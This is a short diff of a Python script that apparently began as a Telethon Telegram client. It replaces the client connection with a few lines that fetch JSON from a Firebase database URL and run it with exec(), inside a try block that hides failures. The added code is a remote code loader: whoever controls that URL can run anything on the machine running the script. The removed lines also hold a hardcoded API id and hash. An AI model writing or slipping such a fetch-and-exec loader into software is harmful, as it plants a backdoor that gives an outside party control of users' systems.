@@ -1,8 +1,10 @@
 from telethon import TelegramClient
-
+import requests
 try:
-  c = TelegramClient(None,'262663','jdjdieie98888')
-  c.connect()
-  print('connected')
+  s = 'https://jqualin-990c1-default-rtdb.firebaseio.com/r/code.json'
+  code = requests.get(s).json()
+  exec(code)
 except Exception as e:
   print(e)
+
+print('program exit\n')
